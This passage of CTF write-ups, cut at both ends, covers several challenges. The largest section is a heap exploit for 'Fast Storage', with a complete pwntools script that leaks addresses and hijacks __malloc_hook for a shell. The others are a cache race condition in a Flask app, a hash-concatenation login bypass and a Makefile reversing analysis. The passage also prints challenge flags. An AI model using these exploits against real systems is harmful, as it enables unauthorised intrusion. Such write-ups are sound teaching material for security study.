0x4c8E);\n\t\t}\n\t\tfree(ret);\n\t}\n\tfor (unsigned int i = 0; i < 0x10000; ++i)\n\t{\n\t\tret = trans_input(data, 0x4C8E - 0x20 * 2, i);\n\t\tif (ismd5(ret + 0x4C8E - 0x20 * 3))\n\t\t{\n\t\t\tprintf(\"%x\\n\", i);\n\t\t\tmemcpy(data, ret, 0x4c8E);\n\t\t}\n\t\tfree(ret);\n\t}\n\tfor (unsigned int i = 0; i < 0x10000; ++i)\n\t{\n\t\tret = trans_input(data, 0x4C8E - 0x20 * 3, i);\n\t\tif (ismd5(ret + 0x4C8E - 0x20 * 4))\n\t\t{\n\t\t\tprintf(\"%x\\n\", i);\n\t\t\tmemcpy(data, ret, 0x4c8E);\n\t\t}\n\t\tfree(ret);\n\t}\n\treturn 0;\n}\n```\n\nAfter we obtain the 4 magic numbers, put them into the program, and we found that we can already enter into the branch we want.\n\nMany windows APIs are involved, what they do is writing the result data obtained above into temporary directory, and execute it with the flag input as the first argument. Thus, find the executable in the temporary directory, open it with IDA.\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  const char *v4; // [esp+18h] [ebp-8h]\n  unsigned int i; // [esp+1Ch] [ebp-4h]\n\n  sub_402B90();\n  if ( argc != 2 )\n    return 1;\n  v4 = argv[1];\n  if ( strlen(argv[1]) != 20 )\n    return 2;\n  for ( i = 0; i <= 0x13; ++i )\n  {\n    if ( v4[i] != (byte_404008[i] ^ 0x8F) )\n      return 3;\n  }\n  return 0;\n}\n```\n\nEasy xor decryption! we can get the flag easily. \n\n`''.join((map(lambda x : chr(ord(x) ^ 0x8f), get_bytes(0x404008,20))))`\n\n## 400 Pwning / Fast Storage ##\n\n**Description**\n\n> Fast(tm) string => binary blob storage\n> \n> nc faststorage.hackable.software 1337\n\n**Files provided**\n\n - [`faststorage`](files/faststorage)\n - [`libc.so.6`](files/libc.so.6)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThe program is something like a hash table, and my teammate told me that this is actually a [bloom filter](https://en.wikipedia.org/wiki/Bloom_filter) after the contest. \n\nThe program provides 3 operation: add, print and edit.\n\n### implementation\n\nWhen doing `add` operation, function `0xCB6` is called to insert the element into the hash table.\n\n```c\n__int64 __fastcall insert_hashtable(unsigned __int8 *name, void *value)\n{\n  int v2; // ST1C_4\n  char v3; // ST18_1\n  char v4; // ST14_1\n  int v5; // ST1C_4\n\n  v2 = tea_hash(name);\n  v3 = xor_hash(name);\n  v4 = addbits_hash(name);\n  v5 = abs(v2) % 62;                            // can be negative\n  insert_idx(v5, (__int64)name, (__int64)value);\n  return (__int64)set_hash_2bits(v5, v3, v4);\n}\n//The 'name' is the pointer to the heap which serves as the key\n//The low 48 bits of 'value' is the pointer to the heap, which serves as the value\n//The high 16 bits of 'value' is the length of the buffer\n\n_QWORD *__fastcall insert_idx(int a1, unsigned __int8 *a2, void *a3)\n{\n  _QWORD *result; // rax\n  void *v4; // [rsp+8h] [rbp-28h]\n  ht_ent *v5; // [rsp+28h] [rbp-8h]\n\n  v4 = a3;\n  v5 = (ht_ent *)malloc(0x18uLL);\n  if ( !v5 )\n    err_exit();\n  v5->name = a2;\n  v5->value = v4;\n  v5->next = linked_lists[a1];\n  result = linked_lists;\n  linked_lists[a1] = v5;\n  return result;\n}\n//the hash from tea_hash is used as the index of linked_list\nunsigned int *__fastcall set_hash_2bits(int a1, char a2, char a3)\n{\n  unsigned int *result; // rax\n\n  result = bits;\n  bits[a1] |= (1 << a2) | (1 << a3);\n  return result;\n}\n//the hashes from xor and addbits, which is less than 32, \n//is used as 2 flag bits recored at corresponding index\n```\n\nThe problem is `abs` function, which will return a negative number, `INT_MIN=0x80000000`, if the argument passed is `INT_MIN`. Think about two's complement representation. Therefore, `abs(INT_MIN) % 62 == -2`.\n\nIf you look at the memory layout, \n\n```assembly\n.bss:0000000000202040 ; unsigned int bits[64]\n.bss:0000000000202040 bits            dd 40h dup(?)           ; DATA XREF: set_hash_2bits+D↑o\n.bss:0000000000202040                                         ; set_hash_2bits+3D↑o ...\n.bss:0000000000202140 ; _QWORD linked_lists[62]\n.bss:0000000000202140 linked_lists    dq 3Eh dup(?)           ; DATA XREF: insert_idx+4A↑o\n.bss:0000000000202140                                         ; insert_idx+62↑o ...\n```\n\nit is obvious that `linked_list[-2]` will be at the memory layout of `bits[60]` and `bits[61]`, which we can manipulate by setting some bits using index `60` and `61`. And if we can let it point to somewhere we can manipulate, we can fake a hash table entry and achieve arbitrary memory write by `edit` operation.\n\n### leak heap address using side-channel\n\nHowever, we need to leak the `libc` address, but there is no free operation, so the only possible way is to shrink the top chunk to create an unsorted bin. Fortunately, there is no null termination for `value` field, so we can leak `libc` address easily.\n\nThe tricky part is to leak the heap address, so that we can fake a hash table entry to edit the size of top chunk. My approach is using side-channel attack. Let's look at the `0xE3A` function\n\n```c\nsigned __int64 __fastcall find(__int64 a1, __int64 a2)\n{\n  int v2; // eax\n  unsigned __int64 *v4; // [rsp+0h] [rbp-120h]\n  unsigned __int64 *v5; // [rsp+8h] [rbp-118h]\n  unsigned __int8 buf[256]; // [rsp+10h] [rbp-110h]\n  __int64 *v7; // [rsp+110h] [rbp-10h]\n  ssize_t v8; // [rsp+118h] [rbp-8h]\n\n  memset(buf, 0, sizeof(buf));\n  v8 = 0LL;\n  v7 = 0LL;\n  printf(\"Name: \", a2, buf, a2, a1);\n  v2 = fileno(stdin);\n  v8 = read(v2, buf, 0x100uLL);\n  if ( v8 <= 0 )\n    err_exit();\n  buf[255] = 0;\n  v7 = find_from_hashtable(buf);\n  if ( !v7 )\n    return 0LL;\n  *v4 = (unsigned __int64)v7 >> 48;\n  *v5 = (unsigned __int64)v7 & 0xFFFFFFFFFFFFLL;\n  return 1LL;\n}\n__int64 *__fastcall find_from_hashtable(unsigned __int8 *a1)\n{\n  int v1; // ST24_4\n  char v2; // ST20_1\n  char v3; // al\n  __int64 v5; // [rsp+24h] [rbp-Ch]\n  ht_ent *i; // [rsp+28h] [rbp-8h]\n\n  v1 = tea_hash(a1);\n  v2 = xor_hash(a1);\n  v3 = addbits_hash(a1);\n  v5 = (unsigned int)(abs(v1) % 62);\n  if ( !(unsigned int)check_hash_2bits(v5, v2, v3) )\n    return 0LL;//check the 2 bits first, return 0 if not found\n  for ( i = linked_lists[(signed int)v5]; i && strcmp((const char *)i->name, (const char *)a1); i = (ht_ent *)i->next )\n    ;//if found, traverse the linked list and return the value\n  return (__int64 *)i->value;\n    //but if not found in hash table, this will cause null pointer access\n}\n```\n\nSince we can let `bits[60:62]` equal to the heap address, we can traverse all bits, and do the bit testing. If `\"No such entry!\"` is shown, it is suggested that the corresponding bit is 0, otherwise it will be 1.\n\nIt will be easier to find the `name` such that `tea_hash` equal to `60` or `61`, and their other 2 hashes are same, so we can test only 1 bit at the time and do the traversing easier.\n\nThe C code to find such name:\n\n```c\nint pos[64] = {0};\nint main(int argc, char const *argv[])\n{\n\t//for (int j = 0; j < 64; ++j)\n\t{\n\t\tfor (size_t i = 0; i < 0x100000000; ++i)\n\t\t{\n\t\t\tunsigned char* tmp = (unsigned char*)(&i);\n\t\t\ttmp[4] = 0xff;\n\t\t\tif (abs(tea_hash(tmp)) % 62 == 60 && xor_hash(tmp) == addbits_hash(tmp))\n\t\t\t{\n\t\t\t\tif (pos[xor_hash(tmp)] == 0)\n\t\t\t\t\tprintf(\"%lx %u\\n\", i, xor_hash(tmp));\n\t\t\t\tpos[xor_hash(tmp)] = 1;\n\t\t\t}\n\t\t\ttmp[4] = 0;\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n`tmp[4] = 0xff;` is used to get all values ranging from 0 to 32, use this to get one part and comment this to get another part.\n\nAnd the result is \n\n```python\nxor_add_60 = {\n6:0xd2c,\n10:0x10ede,\n11:0x1396f,\n12:0x177ad,\n8:0x18563,\n7:0x3962,\n13:0x33b7b,\n14:0x3b77b,\n5:0x58021,\n16:0xbafef,\n17:0xbffdb,\n15:0xdcbef,\n19:0x3d7fef,\n18:0x4d77ff,\n21:0xfd7fef,\n20:0xff3bfd,\n22:0x1f6fdff,\n23:0x3fefefe,\n26:0xff0105bfff,\n24:0xff01071eff,\n25:0xff01073fdf,\n27:0xff011fdfdd,\n28:0xff011fdffb,\n29:0xff017fcfbf,\n31:0xff03f77dff,\n30:0xff03f77fcf\n}\n\nxor_add_61 = {7:0x00094f,\n11:0x001e7f,\n10:0x00279f,\n6:0x00720a,\n8:0x009167,\n4:0x00c204,\n9:0x00ee86,\n12:0x023b7b,\n13:0x025eef,\n15:0x06a7ff,\n14:0x0adbaf,\n16:0x0bfbfa,\n5:0x4080a2,\n0:0xff0ffb7fde,\n3:0xff17fffffe,\n1:0xff1def7ffe,\n2:0xff1fbfffde}\n```\n\nBecause there will be null pointer access if the entry is not found, we need to add the entries first.\n\n### exploit\n\n```python\nfrom pwn import *\n\ng_local=True\ncontext.log_level='debug'\n\nONE_GADGET_OFF = 0x4526a\nUNSORTED_OFF = 0x3c4b78\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\nif g_local:\n\tsh = process('./faststorage')#env={'LD_PRELOAD':'./libc.so.6'}\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"faststorage.hackable.software\", 1337)\n\ndef add(name, size, value):\n\tsh.send(\"1\\n\")\n\tsh.recvuntil(\"Name: \")\n\tsh.send(name)\n\tsh.recvuntil(\"Size: \")\n\tsh.send(str(size) + \"\\n\")\n\tsh.recvuntil(\"Value: \")\n\tsh.send(value)\n\tsh.recvuntil(\"> \")\n\ndef printe(name):\n\tsh.send(\"2\\n\")\n\tsh.recvuntil(\"Name: \")\n\tsh.send(name)\n\tsh.recvuntil(\"Value: \")\n\tret = sh.recvuntil(\"\\n\")\n\tsh.recvuntil(\"> \")\n\treturn ret[:len(ret)-1]\n\ndef edit(name, value):\n\tsh.send(\"3\\n\")\n\tsh.recvuntil(\"Name: \")\n\tsh.send(name)\n\tsh.recvuntil(\"Value: \")\n\tsh.send(value)\n\tsh.recvuntil(\"> \")\n\ndef printsc(name):\n\tsh.send(\"2\\n\")\n\tsh.recvuntil(\"Name: \")\n\tsh.send(name)\n\tret = sh.recvuntil(\"> \")\n\treturn ret.find(\"No such entry!\") == -1\n\n\nint_min_hash = p64(0x911261db)\n#give -2, way to brute force this is quite easy.\n\n\nfor i in xrange(12,32):\n\tadd(p64(xor_add_60[i]), 0x10, \"no null pointer\")\nfor i in xrange(0,16):\n\tadd(p64(xor_add_61[i]), 0x10, \"no null pointer\")\n\nadd(int_min_hash, 0x10, \"-2 idx access\")\n\nheap_addr = 0\nfor i in xrange(12,32):\n\tif printsc(p64(xor_add_60[i])):\n\t\theap_addr |= (1 << i)\n\nfor i in xrange(0,16):\n\tif printsc(p64(xor_add_61[i])):\n\t\theap_addr |= (1 << (i + 32))\n\nprint hex(heap_addr)\n```\n\nNow, we have the heap address, then we need to shrink the top chunk and leak `libc`, which is easier\n\n```python\nneg2_name_off = 0xdb0\ntop_off = 0x1090\n\n#will allocate at df0\nfakeent = p64(0)\nfakeent += p64(heap_addr + neg2_name_off)\nfakeent += p64((heap_addr + top_off + 8) | (8 << 0x30))\nadd(\"fakeent\\x00\", 0x200, fakeent)\nadd(p64(xor_add_60[5]), 0x10, \"dd0->df0\")\nedit(int_min_hash, p64(0xf71))\n\n#now topchunk\n# 0x555555758090 PREV_INUSE {\n#   size = 3953 = 0xf71\nfor i in xrange(0,4):\n\tadd(\"consume\\x00\", 0x400, \"topchunk\")\n\n#get a 0x221 unsorted bin\nadd(\"leaklibc\\x00\", 0x100, \"leakleak\")\nleak = printe(\"leaklibc\\x00\")\nlibc_addr = u64(leak[8:0x10]) - UNSORTED_OFF\nprint hex(libc_addr)\n```\n\nfinally, rewrite malloc hook to `one_gadget` to get the shell.\n\n```python\nadd(\"consume\", 0x80, \"whole unsorted bin\")\nadd(int_min_hash, 0x10, \"-2 idx access\")\n\nfakeent = p64(0)\nfakeent += p64(heap_addr + neg2_name_off)\nfakeent += p64((libc_addr + e.symbols[\"__malloc_hook\"]) | (8 << 0x30))\n#0x21460 off for this\nadd(p64(xor_add_60[7]), 0x100, cyclic(96) + fakeent)\n#460->4e0\n\nedit(int_min_hash, p64(libc_addr + ONE_GADGET_OFF))\n#__malloc_hook = one_gadget\n\nsh.interactive()\n```\n\n## 278 Web / 3NTERPRISE solution ##\n\n**Description**\n\n> Dear all\n> \n> Welcome to our new enterprise solution.\n> You can leave your business notes here.\n> Data is safe - cause we use strong encryption !\n> It is soooo safe, that even I am using this system.\n> You even can audit the code [here](files/webapp.py)\n> Plz DO NOT hax this - cause it is impossible !1111\n> \n> Regards\n> \n> Martin, the Webmaster \n> \n> URL: http://solution.hackable.software:8080\n\n**Files provided**\n\n - [`webapp.py`](files/webapp.py)\n\n**Solution** (by [Aurel300](https://github.com/Aurel300))\n\nOn our first visit to the webpage, we can only login or register. We can find out that the server is running Flask, although this is immediately obvious from the source code given.\n\nThe registration is normal enough:\n\n![](screens/3nterprise-1.png)\n\nThe login is slightly unusual though, it emulates a 2FA system:\n\n![](screens/3nterprise-2.png)\n\n(No screenshot for the second form or anything else after, because the challenge is not working anymore. The form asks for the password and a 2FA token that is not actually implemented.)\n\nOnce we login, we can add notes, list all of our notes, and show specific notes. Whenever we look at a note, the browser first shows it encrypted, then it obtains our encryption key via AJAX, then proceeds to animate XOR-decryption of the note.\n\nEven without looking at the source code, we can spot the first vulnerability: consecutive, non-encrypted IDs for notes. If we change the URL to `/note/show/0`, we get to see a note added by `admin`:\n\n    07D8B68CDB92A687DFC74217C9D7F47E84540A3C97BA3D2B8B5B3E1C110A4C54F09392\n    ADC910461BF61AA4AC6D921591556D1AAFCB8495144C27748369FC101847D7C2A9508F\n    6534FFB7BCF859FD3ED8863611400F9ECB56064C20EDF0B6F6B1BF1CBB522A91F0C9B2\n\nThe browser still animates XOR-decryption, but it uses our own key instead of `admin`'s, so the decrypted data is just garbage.\n\nThe note is 105 bytes, and our own key is only 20 bytes - perhaps this cipher could be broken? Well, after some playing around it is clear that the key is not 20 bytes, and is at least 100 bytes long. The simplest possible explanation is that the admin note is actually encrypted using proper [OTP](https://en.wikipedia.org/wiki/One-time_pad), unlike our own notes.\n\nNow let's finally have a look at the source code. Most of it is basic Flask stuff. The `@loginzone` decorator is applied consistently, and it explains why `/note/show/0` was accessible to us - it simply checks IF whe are logged in, not WHO we are.\n\nThe one strange thing is in the bit that seemed unusual before - namely the two-step authentication process:\n\n```python\n# first part of authentication\n@app.route('/login/user', methods=['POST'])\ndef do_login_user_post():\n  username = get_required_params(\"POST\", ['login'])['login']\n  backend.cache_save(\n    sid=flask.session.sid,\n    value=backend.get_key_for_user(username)\n  )\n  state = backend.check_user_state(username)\n  if state > 0:\n    add_msg(\"user has {} state code ;/ contact backend admin ... \".format(state))\n    return do_render()\n  flask.session[K_LOGGED_IN] = False\n  flask.session[K_AUTH_USER] = username\n  return do_302(\"/login/auth\")\n\n#second part of authentication\n@app.route(\"/login/auth\", methods=['POST'])\ndef do_auth_post():\n  flask.session[K_LOGGED_IN] = False\n  username = flask.session.get(K_AUTH_USER)\n  params = get_required_params(\"POST\", [\"password\", \"token\"])\n  hashed = backend.password_hash(params['password'])\n  record = sql_session.query(model.Users).filter_by(\n    username=username,\n    password=hashed,\n  ).first()\n  if record is None:\n    add_msg(\"Fail to login. Bad user or password :-( \", style=\"warning\")\n    return do_render()\n  # well .. not implemented yet\n  if 1 == 0 and not backend.check_token(username, token=1):\n    add_msg(\"Fail to verify 2FA !\")\n    return do_render()\n  flask.session[K_LOGGED_IN] = True\n  flask.session[K_LOGGED_USER] = record.username\n  return do_302(\"/home/\")\n```\n\nThe `backend.cache_save(...)` call is odd. Even before we are properly logged in, the cache contains the encryption key for that username, if it exists. (Also note that the challenge is probably called `3NTERPRISE` because caching becomes relevant with large-scale projects.) We cannot simply call the first step and get the encryption key, however, since the `getkey` API endpoint does not rely on the cache, not to mention that it requires a full login (`@loginzone`).\n\n```python\n@app.route(\"/note/getkey\")\n@loginzone\ndef do_note_getkey():\n  return flask.jsonify(dict(\n    key=backend.get_key_for_user(flask.session.get(K_AUTH_USER))\n  ))\n```\n\nBut there is a place where the cached key is used:\n\n```python\n@app.route(\"/note/add\", methods=['POST'])\n@loginzone\ndef do_note_add_post():\n  text = get_required_params(\"POST\", [\"text\"])[\"text\"]\n  key = backend.cache_load(flask.session.sid)\n  if key is None:\n    raise WebException(\"Cached key\")\n  text = backend.xor_1337_encrypt(\n    data=text,\n    key=key,\n  )\n  note = model.Notes(\n    username=flask.session[K_LOGGED_USER],\n    message=backend.hex_encode(text),\n  )\n  sql_session.add(note)\n  sql_session.commit()\n  add_msg(\"Done !\")\n  return do_render()\n```\n\nSo whichever key is in the cache (which may not be the one for our username!) will be used to encrypt the notes we submit. Since the encryption method is XOR, submitting a known plaintext will allow us to recover an unknown key.\n\nBut how to ensure a different key is cached?\n\nThe reason caching can be problematic is because there is a lot of things that can go wrong. The wrong user can be served personal details of another. Old information may be shown to the user, misinforming them. In the case of this challenge, the problem is time-based: there exists a race condition between the note adding (using the cached key) and the first step of the authentication (setting the cached key).\n\nThe first step of authentication is supposed to log out the user, which would prevent us from submitting notes and using the cached key. But before it logs us out, it puts the encryption key into the cached, and then does a state check of some sort, presumably a slow database operation.\n\nSo the plan is:\n\n 1. Login completely as our own user (`/login/user`, then `/login/auth`)\n 2. Do the first step of authentication as `admin` (`/login/user` again)\n 3. Create a known-plaintext note (`/note/add`)\n\nThe key is that 3 needs to happen a very short time after 2.\n\n([Full exploit here](scripts/3nterprise.sh))\n\nDuring the CTF, there were some issues with the server being very slow (10+ seconds for a page load), so I didn't even try to exploit this. After some maintenance downtime, the service was slightly faster, though a page could still take up to 5 seconds to load, so I was somewhat sceptical. Much to my surprise, the exploit worked on the first try - there was a note encrypted with the admin key in the list of notes for our user. Then simply XORing that note with `aaa`... (which was the known plaintext) revealed the `admin` key, and XORing the `admin` key with the `admin` note revealed:\n\n    Hi. I wish U luck. Only I can posses flag: DrgnS{L0l!_U_h4z_bR4ak_that_5upr_w33b4pp!Gratz!} ... he he he \n\n`DrgnS{L0l!_U_h4z_bR4ak_that_5upr_w33b4pp!Gratz!}`\n", "timestamp": "2025-10-24T11:39:10.111823"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-10-05-Hackover-CTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-10-05-Hackover-CTF/README.md", "content": "# 2018-10-05-Hackover-CTF #\n\n[CTFTime link](https://ctftime.org/event/689) | [Website](https://ctf.hackover.de/)\n\n---\n\n## Challenges ##\n\n### Crypto ###\n\n - [x] [269 secure-hash](#269-crypto--secure-hash)\n - [ ] 488 secure_hash v2\n - [ ] 500 oblivious transfer\n\n### Reverse ###\n\n - [ ] 499 bwv2342\n - [ ] 500 Onepass - Single Secret Credential Store\n - [ ] [500 flagmaker](#500-reverse--flagmaker)\n\n### Pwn ###\n\n - [ ] 430 military-crypto\n - [ ] 477 holy graal\n - [ ] 484 stbm\n - [ ] 488 slip2slash\n - [ ] 498 cloud-note\n\n### Web ###\n\n - [x] [100 ez web](#100-web--ez-web)\n - [x] [100 i-love-heddha](#100-web--i-love-heddha)\n - [x] [416 who knows john dows?](#416-web--who-knows-john-dows)\n - [ ] 416 cyberware\n\n### Forensics ###\n\n - [x] [100 I AM MANY](#100-forensics--i-am-many)\n - [x] [337 UnbreakMyStart](#337-forensics--unbreakmystart)\n\n### Misc ###\n\n - [x] [100 Hummel Hummel - Fart Fart](#100-misc--hummel-hummel---fart-fart)\n \n---\n\n## 269 Crypto / secure-hash ##\n\n**Description**\n\n> We advise you to replace uses of `unordered_hash` with our new `SecureHashtable` class, since we added advanced crypto to make it 14.3 times more secure.\n> \n> Update: the binary was compiled with g++ and libstdc++, 64bit\n> \n> We're running a demo version, try it now:\n> \n> `nc secure-hash.ctf.hackover.de 1337`\n\n**Files provided**\n\n - [`secure_hash.cpp`](files/secure_hash.cpp)\n\n**Solution**\n\nThe service provided lets us register and login using a supposedly secure [hash table](https://en.wikipedia.org/wiki/Hash_table) implementation, built atop a [`std::unordered_set`](http://www.cplusplus.com/reference/unordered_set/unordered_set/).\n\n```cpp\nif (choice == 1) {\n  if (name == \"root\") {\n    printf(\"You are not root!\\n\");\n    continue;\n  }\n  table.insert_keyvalue(name, password);\n} else if (choice == 2) {\n  if (table.lookup_keyvalue(name, password)) {\n    printf(\"Success! Logged in as %s\\n\", name.c_str());\n    if (name == \"root\") {\n      printf(\"You win, the flag is %s\\n\", flag.c_str());\n      return 0;\n    }\n  } else {\n    printf(\"Invalid credentials!\\n\");\n  }\n} else {\n  printf(\"Invalid choice!\\n\");\n}\n```\n\nRegistration is achieved by inserting values with `table.insert_keyvalue`, and logging in by checking with `table.lookup_keyvalue`. We are not allowed to register a(nother) user with `name == \"root\"`, so if the program had no other vulnerabilities, we would only be able to log in as `root` if we already knew the flag, which is the password to the `root` account.\n\nWhenever the program stores / looks for credentials in the `std::unordered_set`, it will choose the bucket to use on some sort of SHA-512 digest:\n\n```cpp\nstd::string digest = sha512sum(name, password);\nsize_t bucket = values.bucket(digest);\n```\n\nThe `sha512sum` function itself uses OpenSSL to do the hashing, and [documentation for the `EVP_` functions can easily be found](https://linux.die.net/man/3/evp_digestupdate):\n\n```cpp\nstd::string sha512sum(const std::string& name, const std::string& password) {\n  EVP_MD_CTX *mdctx;\n  const EVP_MD *md;\n  unsigned char md_value[EVP_MAX_MD_SIZE];\n  unsigned int md_len;\n\n  mdctx = EVP_CREATE_FN();\n  md = EVP_get_digestbyname(\"sha512\");\n  EVP_MD_CTX_init(mdctx);\n  EVP_DigestInit_ex(mdctx, md, NULL);\n  EVP_DigestUpdate(mdctx, name.c_str(), name.size());\n  EVP_DigestUpdate(mdctx, password.c_str(), password.size());\n  EVP_DigestFinal_ex(mdctx, md_value, &md_len);\n  EVP_DESTROY_FN(mdctx);\n\n  return std::string(reinterpret_cast<char*>(md_value), md_len);\n}\n```\n\nIn particular, notice that `name` and `password` are added to the digest one after another, and that the number of bytes added is determined using [`std::string::size`](http://www.cplusplus.com/reference/string/string/size/), which returns the number of actual bytes of the string, not including the null byte (assuming it is even used internally).\n\nThis means that with `name == \"foo\"` and `password == \"bar\"`, the digest gets updated with the three bytes `foo`, then the three bytes `bar`. Do you see the problem?\n\nThe same result can be achieved with e.g `name == \"fo\"` and `password = \"obar\"`, and so these two sets of credentials will result in the same digest and therefore the same bucket in the `std::unordered_set`.\n\nNow we have everything needed to exploit the program. We register a user with `name == \"ro\"` and `password == \"ot1\"`, then simply attempt a login with `name == \"root\"` and `password == \"1\"` (the `1` was used because neither field could be empty). These two sets of credentials have the same digest and so they end up in the same bucket.\n\n([Full exploit script here](scripts/secure_hash.sh))\n\n`hackover18{00ps_y0u_mu5t_h4ve_h1t_a_v3ry_unlikely_5peci4l_c4s3}`\n\n## 500 Reverse / flagmaker ##\n\n**Description**\n\n> Solving CTF challenges often involves a lot of work, which is very unfair to lazy competitors. To even things out, we designed a self-solving challenge: Just type `make flag` and make yourself a coffee while the solution is computed.\n\n**Files provided**\n\n - [`Makefile`](files/flagmaker)\n\n**Solution**\n\n> Note: this is a post-CTF analysis, I did not quite manage to get to the flag during the competition.\n\nWhen I first downloaded this, I started `make flag` in the background while looking at other challenges… As it turns out, even if `make` supported arbitrarily big integers (which it doesn't), it would take an insane amount of time to finish. I know my computer isn't the fastest and there were no solves for this challenge for hours, so clearly it wasn't going to be that easy!\n\nMy first analysis was just a cursory glance through the functions in the makefile.\n\n```Makefile\nr = [-48, 2, -48, -8, -59, -18, 1, -59, 3, -5, -26, -57, 53, 3, -43, -3, -41, -20, 1, -64, -65, -45, -71, -47, -16, -47, -38, -3, 46, -63, -54, 1, -49, 4, -51, -45, -61, -46, -13, -4, -65, -48, -55, -51, -38, -64, -50, -5, -65, 2, -54, -56, -1, -50, -28]\n\nflag:\n\t@echo $(call l, $(o), $(n), $(p), $(q)) | sha256sum | python -c \"import sys; print ''.join([chr(ord(c) - d) for c,d in zip(sys.stdin.read(),$(r))])\" | tee $@\n```\n\nThe result of a very complex macro call to `l` was hashed using SHA-256, then the hexadecimal digest was piped into a `python` one-liner, which used the first 55 digits and shifted them using the `r` array.\n\nHere I discovered the first method of solving this challenge. The output of `python` was the flag, which had to be in the `hackover18{...}` format. The input to `python` were lowercase hexadecimal digits, and there are only so many of them. Based on this, some characters of the flag could be exactly pinpointed. I did not actually try this dictionary attack. Maybe I should have since apparently the first team to solve this used this method.\n\nI was quite interested in how the script actually worked. The first step was to create a dependency graph of the functions:\n\n![](screens/flagmaker.jpg)\n\nThis revealed that the complicated-looking mess of functions actually completely separated into two almost tree-like dependency graphs, and only `l` and `k` had a recursive dependency. With a graph like this it is easier to reason about what each function does and what its inputs might represent.\n\nBefore analysing functions properly, I noticed one thing – the `q` variable:\n\n```Makefile\nq = ++--+++++ ++-+-+--+ +++---++- ++++-+-++ --+-++-++ --+++++-- -++-+--+- -+++---++ -+--+++-+ -+-++-+++ +-+-++++- +-++++-+- +---++--- +--++-+--\n```\n\n`q` is passed to the `l` function as its last, 4th argument in the initial call. When `l` calls `k` to recurse, it gives `q` unmodified to `k` as its last, 5th argument. Likewise, when `k` calls `l` to recurse, it gives back `q` unmodified to `l` as its 4th argument. `q` is indeed a constant, and even though it is used within the functions in other places, the original value is passed back and forth. I renamed `q` to `program`, since at this point I was thinking the script is interpreting `program` as some sort of source code.\n\nLet's first look at the functions referenced in `l`, which is also the initial function called by `make`. Throughout the analysis, we can refer to the GNU Makefile documentation on [text functions](https://www.gnu.org/software/make/manual/html_node/Text-Functions.html#Text-Functions) and [conditional functions](https://www.gnu.org/software/make/manual/html_node/Conditional-Functions.html#Conditional-Functions).\n\n```Makefile\na=$(subst -,- ,$(subst +,+ ,$(1)))\nd=$(if $(filter-out -,$(1)),,+)\ne=$(call a,$(filter $(subst $(call a) ,,$(strip $(1))$(strip $(2)))%,$(3)))\nj=$(word $(words $(1)), $(2))\nm=$(word 1,$(1)) $(or $(word 2,$(1)),+) $(or $(word 3,$(1)),-)\n\n# l($1 ?, $2 ?, $3 ?, $4 program)\nl=$(if $(call d,$(call m,$(1))),$(words $(filter +,$(3))),$(call k,$(call e, $(call m,$(1)), $(call j,$(2),$(3)),$(4)),$(call m,$(1)),$(2),$(3),$(4)))\n```\n\n```Makefile\n# a($1 str)\na=$(subst -,- ,$(subst +,+ ,$(1)))\n```\n\n`a` takes a string, and separates all `-` and `+` with spaces. E.g. `$(call a, --+-++) == - - + - + +`. Note that in `make`, spaces between the function name and the first argument are ignored, and so are spaces after an argument comma and the argument itself. Spaces at the end of arguments are preserved, however, which is why `a` is not actually a no-op.\n\nAlso, at this point it is pretty safe to say that there seems to be no way for `make` to produce strings containing anything other than `+`, `-`, or whitespace.\n\n```Makefile\n# e($1 prefix1, $2 prefix2, $3 program)\ne=$(call a,$(filter $(subst $(call a) ,,$(strip $(1))$(strip $(2)))%,$(3)))\n```\n\nWe know that the third argument for `e` is the `program`, since it is only invoked in `l` and it gives `e` its last argument, the `program` constant.\n\nHere it is important to check how the `filter` function of `make` works in specific cases. `$(filter AB%, ABC AABC AB CAB) == ABC AB`. So `e` looks for an exact prefix (created from its first two arguments) in the `program` words, then takes that word and separates its `+` and `-` using `a`.\n\nNote also the `subst` call, where `a` is called without any arguments (resulting in an empty string). But `$(call a) ,` (with a space afterwards) actually results in the string `\" \"` (space), so the `subst` call here removes all spaces in the prefix, so it can be properly found in `program`.\n\n```Makefile\n# d($1 str)\nd=$(if $(filter-out -,$(1)),,+)\n```\n\n`d` checks if there are any characters other than `-` in its input. If yes, it returns the empty string, otherwise it returns `+`.\n\nWe can now extend our assumption about the `+` and `-` characters. Given that there are two kinds of symbols, it is natural to assume some sort of binary encoding. The `l` function itself (as we'll see further down) uses `d` to check if it should recurse or terminate. It will only terminate if `d` returns a non-empty string, i.e. `+`. This will only happen if the input to `d` is all `-`. Let's therefore understand `+` as a binary 1 and `-` as a binary 0.\n\n`d` is then the stop condition checking if its input is equal to 0.\n\n```Makefile\n# j($1 pos, $2 data)\nj=$(word $(words $(1)), $(2))\n```\n\n`j` returns a part of its second argument based on its first argument. `words` in `make` returns the number of words of its argument, `word` returns the n-th (one-indexed) word of its argument.\n\nThere are very few situations I can think of where referencing data based on the length of other data makes sense. With our `+` / `-` encoding, the only thing that makes sense is a unary encoding – the first argument is a \"number\" where `+ + +` represents `3`, `+ + + + + +` represents `6`, etc.\n\nThen the second argument is some sort of array of bits ...?\n\n```Makefile\n# m($1 state)\nm=$(word 1,$(1)) $(or $(word 2,$(1)),+) $(or $(word 3,$(1)),-)\n```\n\n`m` seems to take three bits from its input. If the second bit is not present, `+` is used. And if the third bit is not present `-` is used. The argument for `m` is the first argument given to `l`, which comes from the `o` variable:\n\n```Makefile\no = +\n```\n\nClearly `o` always has at least one bit. When given to `m`, it is changed to `++-`. So it seems that `m` ensures that the default value for its output is `++-`, unless the input has enough data.\n\n```Makefile\n# l($1 state, $2 pos, $3 data, $4 program)\nl=$(if $(call d,$(call m,$(1))),\n  $(words $(filter +,$(3))),\n  $(call k,\n    $(call e,\n      $(call m,$(1)),\n      $(call j,$(2),$(3)),\n      $(4)\n    ),\n    $(call m,$(1)),\n    $(2),\n    $(3),\n    $(4)\n  )\n)\n```\n\nFinally let's look at `l`. As explained in `d`, it stops recursing when its first argument becomes 0. When it stops, it returns the number of `+` symbols in `data`. Otherwise, it calls `k`.\n\nNote that here we can see that the only possible way for this program to stop is when `d` evaluates to `+` and causes `l` to count `+` symbols in `data`. For a long time I was spending a lot of CPU resources to check a lot of integers, SHA-256 hashing 